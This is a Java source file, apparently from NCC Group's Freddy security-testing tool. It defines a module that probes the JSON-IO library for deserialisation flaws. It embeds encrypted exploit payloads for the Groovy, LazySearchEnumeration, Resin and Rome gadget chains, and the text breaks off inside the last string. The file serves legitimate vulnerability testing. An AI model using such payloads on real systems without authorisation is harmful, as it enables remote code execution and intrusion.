// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the Java JSON-IO library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class JsonIoModule extends FreddyModuleBase {
    //Time-based payload delay
    private static final int TIME_DELAY = 18000;

    //Groovy payload data
    private final String GROOVY_PREFIX = decrypt("YoJ/fwsSOW+dKdjhPEGl3qzRLESlmQVMRDZpTmecMYBR2j1pUj43DjPWjACYzxY2CuCBEgw4kYWGWXXigFTDztRZvV0LJlOTzapwHfk/0hx3YpNsIEn23gSQs0Z/ywdTqZXAiL5kBQKs0Cc/Xd9oIOgS6JEBMN9EnrRXvv9FTCj655Bb/LIrAYnV66KwM9YXCm/j+bKQWg55RifCSP09fad0fk8MTTHPPyDB74ZB7YPm/cHfzGwmBpsnH0IdvQAtKOdGOTIPYJOB98gB00w57X2+FM/zrO6nTUifn06KdaOM386C3C+0rwwO2/F8siUNxG4IjAoUveSMbg5K0gjOXM7xyxTSQLlmrjpYLfWYpwWSvmEWrp8evLnw668PxPHNPHFjAkhPPmBlBikCktBOzW+xSWNFIU1saWlipvd7nDZiInmzWxet7cMl+R1ukUUx");
    private final String GROOVY_SUFFIX = decrypt("ZCG2W6nm5kwAKv8RcBGMYEz8qjyScP5Jpzg//Sre1O1yj+eB+k44g4JmWGha5qxHu+oQzZ0G0oIvtDBO2/oh8h2EEosk03XL1MX3aE6JoD2zJMQGAOr12rS1cx2vDEfI4IAHbkIMkm/27DmH8Qqbb6NK7oMuOx4OmSy4lQAXASnIIzTCzv0+ox2uoIkxRyb+KY7vz6Vo4OXbxsE+aqAAZfJYHH7pjo8U4fvzS9oJIWCsZ4N90JIROrWLQKtl5T2XRmKP3PGe0WuvyKIt4O71Pt0riTxNNJMJymlLhF8SxacZlFaOXkTE0FEAwQiBNgxV4VhwSZrhyDtOAK2yhdecCh2sPepxKbSWnJtKvyorNOInwA6rG6Pv0dpTgJx15XUu8yMgUXSOn6tLBOLjaiq4A8HEhLgo0aq7puzw3+NkJk0=");

    //LazySearchEnumeration payload data
    private final String LSE_PREFIX = decrypt("YoJ/fwsSOW+dKdjhPEGl3qzRLESlmQVMRDZpTmecMYBR2j1pUj43DjPWjACYzxY2CuCBEgw4kYWGWXXigFTDzrlkzaiEPB7C3lSemzpDrAyDYry/fNcozgi53LANGXjobxutdiL73QZCWY+NTkcmlE5hzb/KQjoji0WZRqQuotkttqgzGht43lvABrLG7wT+g55jfynTa5dpf9vbPjttflPhi4joYfly/Rt/9+fniLw/NwJMPylbhT+2ybRduuKW2l5vstNJazt0zGJgEAWWEf6eg2d1LhRufY5+bth1rzYNEVPGfd6NBvn3L3r4xnuD5UidcODD0O6blSMD/XKkxFgc97BdiSRKsXMATeBOPqEQ93kFpEClgfuI6EUR0zd/fibbRZ+4J8dW/mwBagKeOD9BSree1/8uwPg/ks1z6eODPa/CV21VDMWT6nwL6eVT5AgxdpN8BGdcDw67dyPt1AJAcZsU9V/llH/a4Babhu6FIsgT4oQNPh16+GHvxOOBypFOK0Ln+X8fk0+BFsDRIJobtWGV4XZ7bbnhZk0Z1unpOUyvMw+1LTmHh8yMljhXR6w7/lNerQ7JoSzyxbZQBovfkFnX4YXBnihSj7FlMhnGRnA9qMXODF7rSkvPDleCG2ljeQjLATtowhbl6xBmlupUzIE3VPODAK+RPhAzimCBUcKl+737q6/n2npXL7BPZBAG4Tk9GOklwLA9iMX/iLl6WxFwF8jsTZtaIE7p+lFYGweJPYe966hyzHzqiG8Y5VWAILrj+6KyOocTIvFWZMwAGFjbaZDfG5BzA91TF3OY19DHOfw6K8ab7j2GbMsMLIruYxKlUKZQY7tJCUvuu76IkBPX3gJzKLTeAfa5ARv+d9H54nb+v+Cf5BuJHrZYPiBDNGOQoGu05pYIe356BzI4ncUDEHMNvCx25UsaOcgNSzN+xAfYwGZ5hLQ9z2YpxRb9pAsJyk2f7Ow8xC7artzJJBUGf7w50d9/7M8g6BmlMxQM2caTAhsiTmk2qLK1eO3IquZ08IQDn620tZk2VbWBCD9fjJgw2MSbVX7E+Rl0Q2KplnTNQLUdpRIgt7E5U5gqHAUg+wDPw4OUAbXuyGy7e47LaTLO7qiWnOVTs0BpIbDPO5/YF1G09KPHS0Kv6Q1kqtqV8FpBjsJFdp3gGTB3jLlRajip923dIGMI4KelqMstJbXkkhwXPqxjtawfpatnstuWDehUiBuxAqoW28xaEQ0ZKhw3TKmbKPe4uPbAkMiLkBs91o6AxWWkFFhgThCP0lxhrjc5HL7CSeaR3IaFD/pV7+gzVyBQgmunzOuyl5H181Xos47MIIzIQ/jwbLt7jstpMs7uqJac5VOzQFRjC1dT6n/zr+5NiNtI77ehSttcl56JFyrPqh4yIjq4DMsMaIfAcNyHoiyNbekYFk9V83Aoh30OjMk6Actp8SuhQkM6KHSpW3pev/Z5DZwQF6iktz2u5zDLSIT7QcHp6usfo+JGBK482mFt/jADoMA=");
    private final String LSE_SUFFIX = decrypt("DUmDbrriIlRVOc9biej6uJkd8yW1ZB3R3wD2BnAdD0RUppPUUpI3CYYVrASBaViyBcd2kpYJpMYO1yn4Aysh6lZ3qB5wB+FTvQOyGbhgqgAopBRJJI6258NBKlSKh48XLsRffgZ5FnaBqDGGd52062DgRu10ogsjvYG5hv/gexoZlFaOXkTE0FEAwQiBNgxV7CncZFvrNUB7BSLLYlmj1Yhgd9WSFUdtQ/ro8Mo6/Rkvvr+QlWMe5vDe3RiwhWbasWeSkhf4/oGSPaXOz88LnpmJN5MtUPjnsXUBPwVJ0nHc3nvehMKvBtmw7s3w7ECjuqrI/Miynmig8QKk6qoR7pSlW9qncXeEsa4UXkJ4hTAli8iYvxIjHfGNy1N2Jqg+XDHRboKujJxIHUg/nauqyrItrR+BPKb9FOIKKXnhYEyepIIgLpIsPXfV1L7ABS0rLWufKhFl2PS9Bo7WmgmO00TgmCWYwJ6AtKDOY5HjvfvKga3dgnjAIMygDj6GCwTmHx90fKx/c4EwchxOya2YzXjiQ9+lfqZ97weRJk1cJ2FA2/wAfRC308DDqnWl2quG3qnI3eeT9JqFRofyJUPtcTwyMALydo5x8MQ2UaaNieMI3KA9jwb05TiTgQXld8EpxDqY35MEqiEeJcCsYhk/NJY4D2x53EiPiDhw+a+yLfxihs0d79fdE2+IdDYB03xklaVFVc4sTrOPMJPzk0zPbkRCr1pluvcysGjU87RE/Jt/5v6FwVUmajipSsHVtBydZi80j0+VVl/R57dSE89mng+Dk9y3b3EXba2DMdv14Nfo/32pSG7EbyZqZue/MIpqrzaC0C65lSN0oaTvGqZXI9Ib+OXLleUirk+stFdeqUpIB3yNNydWTw9pG/fRgzi5rYq15KoJPeCBmr39L3q8z3po1UuNx4X4V9fVbfqV/WcwnrOolX+g3VZS+zQorfNI/chdkrK0/aBhoW9dLv5LJ7kM+pspMPelugtQEbHjSwzXcUmiPcYRdPBS0d1C6AHlGWYta5MWawkjlgZ0gUGmDS4BaoJWb6geHcXulLHczauKqpRFARVEROpYd3g1tY8LSJ4UrEuQZlu5778gX3SaPFuPm8zYsGT1/3XFBvW/rRy4aCZKIurz6o5c33wU0sngT3p7wnExKFg6D+0NNKnOzKc1oNSmM8V03VfTeKr0qi+gvKUHt0rZATizIhNFul2D/vUAfVWFRa9uXOwCpNIfBoiUFtpb9rWC+TS7zxXAoIsd3jlxCk71oO1D8+HVgoTb8/1eVKcnpUkFpnKNK8E+2Bp/g8Fr+QtOCnSMgtaz7/66N9tdmWdgsxpB0io7gC0Rd6Vs3XP6qrHamhs9DqGrrQ9/0sKFOsKwGCnrKl1orBcsOj3OnjZbMHtsDVf2IbR/+lZ1A5b/QQLKd73hIOkjlqX8vmoRH0Ph1uqrF+Sz/U+srjnMGREBqYxPgSVL7pBG6r5MYUIW7IaZ7vSb+zQ23OoE2Z+PWyHJnFUIZmBbtkx1N7AgNhMiG0lQE8+sDDt5yvl5j/5ksokSfjX8ENVJ8F4FAhkArLxmjc9j+jDuVE07rUIw6oxbUAQLFaoX1jdHVh6gGukSIxyTYkiCn0Yqaa9f5uYSh6y4AzHzZdvusBk=");

    //Resin payload data
    private final String RESIN_PREFIX = decrypt("YoJ/fwsSOW+dKdjhPEGl3sHWsY+Z4z8ntJs5qRoDLlrVdgEqrzU5NVp0xU9dhpsr4VHD+TsC/R+BunI9nf95At8Y6AS1UpugYRJzPRhscNlZE+ZMofR4JixjF8SG+68f7z/NkztvWwx4tupddWeFWcXwfG3usur3Ji8Vf4FsG2nYpVFlUX7Rnv4JIhmI+FwBVRaVS8auoPiZTYosDMQyZFyopsC4Vka7PejQqHwSzWrV5ABhljQKG/VY5exgmQNace7YWkeMLA+pOj1mMG7ZPYCGHoxzH3bZGqUFLJ21OhHDwkoEUgToZI+HXUeNKOhBFSvjC/A16Wjti766W6tb0PnJI9mvetr3616lG1LHj2rBbWS4IxdZT3iv3HYjhQGMXiQa3RUOhRQtnyW3NDRqwgC3PYzkon6dAnGuoHxBNrtxdp0HhuKoN5qqhbq1egtX44l7BC9zuc62LWS0c0XHhB4FvkXu8oVF757fv0TuGHTGB87GG4x0BOdbQZ3+ljxk");
    private final String RESIN_SUFFIX = decrypt("DUmDbrriIlRVOc9biej6uJkd8yW1ZB3R3wD2BnAdD0RUppPUUpI3CYYVrASBaViyBcd2kpYJpMYO1yn4Aysh6vnDBn9ZeDXgq/5t94AJ5LKnS+AGPCxv2GqOOUurI5jWtEgcC4quJIUyn1VU5e4qScPF2545b14LpmdPLawc1kIu1nEGlf8CVZvfcEBApeVeBBj9PnyXVR+JKcie9SvkybItyGTnUZ6E+88I5fejJn6KcKmJVk8Y3YSwzWcRS3GgxwOw4/a0z8OSXwekttQ9hkiv7GX/7jzqmVnxhXQ0YfcQyL3X/DOeQCgpmLijB/uf5nlOUclq7dKkv/EVMlcdlamJLamWOQalTBwFJDC72nDmIx3DypQkkNGjg60mKO9rjwT3Mwmk9yXuMEhx6tKFhFYeoBrpEiMck2JIgp9GKmkNOgWjaTbP+y//CmI+9r8h");

    //Rome payload data
    private final String ROME_PREFIX = decrypt("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");
    private final String ROME_SUFFIX = decrypt("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